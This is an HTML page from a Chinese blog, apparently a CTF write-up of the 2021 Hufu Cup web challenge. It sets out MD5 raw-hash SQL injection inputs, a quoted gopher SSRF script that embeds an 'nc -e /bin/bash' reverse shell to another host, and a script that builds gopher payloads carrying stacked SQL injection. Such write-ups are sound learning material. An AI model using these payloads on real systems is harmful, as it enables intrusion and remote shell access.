@@ -1,0 +1,205 @@
+
+<!DOCTYPE html>
+<html lang="en" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>2021虎符杯部分web - 月出从云</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="Fechin,"> 
+    <meta name="description" content="“慢慢做”管理系统这道题是sql和ssrf的结合，感觉还是挺有意思的。可惜自己SSRF真的菜，
+第一步比较坑，这个比较难想到..
+不过好险后门给了hint：
+12这个sql吧，有点ssrf的样子，首,"> 
+    
+    <link rel="alternative" href="atom.xml" title="月出从云" type="application/atom+xml"> 
+    <link rel="icon" href="/img/1.ico"> 
+    
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+	<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+    <script>
+         (adsbygoogle = window.adsbygoogle || []).push({
+              google_ad_client: "ca-pub-8691406134231910",
+              enable_page_level_ads: true
+         });
+    </script>
+    <script async custom-element="amp-auto-ads"
+        src="https://cdn.ampproject.org/v0/amp-auto-ads-0.1.js">
+    </script>
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+<body class="loading">
+    <span id="config-title" style="display:none">月出从云</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://example.com"></a>
+    <div title="播放/暂停" class="iconfont icon-play"></div>
+    <h3 class="subtitle">2021虎符杯部分web</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">2021虎符杯部分web</h1>
+        <div class="stuff">
+            <span>四月 03, 2021</span>
+            
+  <ul class="post-tags-list" itemprop="keywords"><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/PHP/" rel="tag">PHP</a></li><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/SSRF/" rel="tag">SSRF</a></li><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/object-Object/" rel="tag">[object Object]</a></li></ul>
+
+
+        </div>
+        <div class="content markdown">
+            <h1 id="“慢慢做”管理系统"><a href="#“慢慢做”管理系统" class="headerlink" title="“慢慢做”管理系统"></a>“慢慢做”管理系统</h1><p>这道题是sql和ssrf的结合，感觉还是挺有意思的。可惜自己SSRF真的菜，</p>
+<p>第一步比较坑，这个比较难想到..</p>
+<p>不过好险后门给了hint：</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">这个sql吧，有点ssrf的样子，首页是一个很普通的sql注入，没有什么花样，但是我的admin.php是一个内网的管理系统，只要你用“真-admin”的密码登录了，就可以拿到flag，反正慢慢做就对了，不要急躁，静下心。</span><br><span class="line">第一步登录的sql语句是&quot;SELECT * FROM users WHERE password = &#x27;&quot;.md5($password,true).&quot;&#x27; limit 0,1&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>那我们尝试ffifdyop，结果被过滤了，不过没事，还有另外几个payload：</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">4611686052576742364</span><br><span class="line">e58</span><br><span class="line">129581926211651571912466741651878684928</span><br></pre></td></tr></table></figure>
+
+<p>随后打一个都可以。</p>
+<p>进去之后允许我们打ssrf了，</p>
+<p><img src="image-20210403203653415.png" alt="image-20210403203653415"></p>
+<p>这个提示很明显了，用gopher协议去打，可惜自己并不会ssrf【】。</p>
+<p>看了篇这个文章，发现可以试试看这个：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">https://zhuanlan.zhihu.com/p/<span class="number">112055947</span></span><br><span class="line">脚本：</span><br><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> urllib2,urllib</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://192.168.0.109/ssrf/base/curl_exec.php?url=&quot;</span></span><br><span class="line">header = <span class="string">&quot;&quot;&quot;gopher://192.168.0.119:8080/_GET /S2-045/ HTTP/1.1</span></span><br><span class="line"><span class="string">Host:192.168.0.119</span></span><br><span class="line"><span class="string">Content-Type:&quot;&quot;&quot;</span></span><br><span class="line">cmd = <span class="string">&quot;nc -e /bin/bash 192.168.0.109 6666&quot;</span></span><br><span class="line">content_type = <span class="string">&quot;&quot;&quot;自己填写(不要有换行)&quot;&quot;&quot;</span></span><br><span class="line">header_encoder = <span class="string">&quot;&quot;</span></span><br><span class="line">content_type_encoder = <span class="string">&quot;&quot;</span></span><br><span class="line">content_type_encoder_2 = <span class="string">&quot;&quot;</span></span><br><span class="line">url_char = [<span class="string">&quot; &quot;</span>]</span><br><span class="line">nr = <span class="string">&quot;\r\n&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 编码请求头</span></span><br><span class="line"><span class="keyword">for</span> single_char <span class="keyword">in</span> header:</span><br><span class="line">    <span class="keyword">if</span> single_char <span class="keyword">in</span> url_char:</span><br><span class="line">        header_encoder += urllib.quote(urllib.quote(single_char,<span class="string">&#x27;utf-8&#x27;</span>),<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        header_encoder += single_char</span><br><span class="line"></span><br><span class="line">header_encoder = header_encoder.replace(<span class="string">&quot;\n&quot;</span>,urllib.quote(urllib.quote(nr,<span class="string">&#x27;utf-8&#x27;</span>),<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 编码content-type，第一次编码</span></span><br><span class="line"><span class="keyword">for</span> single_char <span class="keyword">in</span> content_type:</span><br><span class="line">    <span class="comment"># 先转为ASCII,在转十六进制即可变为URL编码</span></span><br><span class="line">    content_type_encoder += <span class="built_in">str</span>(<span class="built_in">hex</span>(<span class="built_in">ord</span>(single_char)))</span><br><span class="line">content_type_encoder = content_type_encoder.replace(<span class="string">&quot;0x&quot;</span>,<span class="string">&quot;%&quot;</span>) + urllib.quote(nr,<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="comment"># 编码content-type，第二次编码</span></span><br><span class="line"><span class="keyword">for</span> single_char <span class="keyword">in</span> content_type_encoder:</span><br><span class="line">    <span class="comment"># 先转为ASCII,在转十六进制即可变为URL编码</span></span><br><span class="line">    content_type_encoder_2 += <span class="built_in">str</span>(<span class="built_in">hex</span>(<span class="built_in">ord</span>(single_char)))</span><br><span class="line">content_type_encoder_2 = content_type_encoder_2.replace(<span class="string">&quot;0x&quot;</span>,<span class="string">&quot;%&quot;</span>)</span><br><span class="line">exp = url + header_encoder + content_type_encoder_2</span><br><span class="line"><span class="built_in">print</span> exp</span><br><span class="line">request = urllib2.Request(exp)</span><br><span class="line">response = urllib2.urlopen(request).read()</span><br><span class="line"><span class="built_in">print</span> response</span><br></pre></td></tr></table></figure>
+
+<p>其实会打ssrf的话这题并不是很难，跟强网杯的随便注是一个意思，直接照抄思路即可。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"><span class="comment"># z = &quot;username=&#123;&#125;&amp;password=123&quot;.format((</span></span><br><span class="line"><span class="comment">#                                           &quot;admin1&#x27;;use ctf2;rename table fake_admin to fake_admin1;rename table &quot;</span></span><br><span class="line"><span class="comment">#                                           &quot;real_admin_here_do_you_find to fake_admin;show tables;#&quot;))</span></span><br><span class="line">z = <span class="string">&quot;username=&#123;&#125;&amp;password=123&quot;</span>.<span class="built_in">format</span>(<span class="string">&quot;admin&#x27;;show databases;&quot;</span>)</span><br><span class="line"><span class="comment"># table real_admin_here_do_you_find</span></span><br><span class="line"><span class="comment"># use ctf2;rename table real_admin_here_do_you_find to fake_admin</span></span><br><span class="line"><span class="comment"># z=&quot;username=&#123;&#125;&amp;password=123&quot;.format((&quot;admin1&#x27;;use ctf2;desc real_admin_here_do_you_find;#&quot;))</span></span><br><span class="line"><span class="comment"># z=&quot;username=admin&amp;password=5fb4e07de914cfc82afb44vbaf402203&quot;</span></span><br><span class="line">a = <span class="string">&#x27;&#x27;&#x27;POST /admin.php HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 127.0.0.1</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="string">Content-Length: &#123;&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#123;&#125;&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">a = a.<span class="built_in">format</span>(<span class="built_in">len</span>(z), z)</span><br><span class="line">res = urllib.parse.quote(urllib.parse.quote(a).replace(<span class="string">&#x27;%0A&#x27;</span>, <span class="string">&#x27;%0d%0A&#x27;</span>))</span><br><span class="line"><span class="comment"># payload = &#x27;gopher://127.0.0.1/_&#x27;+res</span></span><br><span class="line">payload = <span class="string">&#x27;gopher://127.0.0.1:80/_&#x27;</span> + res + <span class="string">&quot;%250d%250A&quot;</span></span><br><span class="line">print(payload)</span><br></pre></td></tr></table></figure>
+
+<p>再ctf2中我们可以查看到：</p>
+<p><img src="image-20210403205334277.png" alt="image-20210403205334277"></p>
+<h1 id="unsetme"><a href="#unsetme" class="headerlink" title="unsetme"></a>unsetme</h1>
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                        
+                            <li title='0' data-url='http://link.hhtjim.com/163/425570952.mp3'></li>
+                        
+                    
+                        
+                            <li title='1' data-url='http://link.hhtjim.com/163/425570952.mp3'></li>
+                        
+                    
+                </ul>
+            
+        </div>
+        
+    <div id='gitalk-container' class="comment link"
+		data-enable='true'
+        data-ae='false'
+        data-ci=''
+        data-cs=''
+        data-r='https://github.com/ysllz/ysllz.github.io'
+        data-o='https://github.com/ysllz/ysllz.github.io'
+        data-a='ysllz'
+        data-d='false'
+    >查看评论</div>
+
+
+    </div>
+    
+        <div class='side'>
+			<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E2%80%9C%E6%85%A2%E6%85%A2%E5%81%9A%E2%80%9D%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F"><span class="toc-number">1.</span> <span class="toc-text">“慢慢做”管理系统</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#unsetme"><span class="toc-number">2.</span> <span class="toc-text">unsetme</span></a></li></ol>	
+        </div>
+    
+</div>
+
+
+    </div>
+</div>
+</body>
+
+<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+</html>
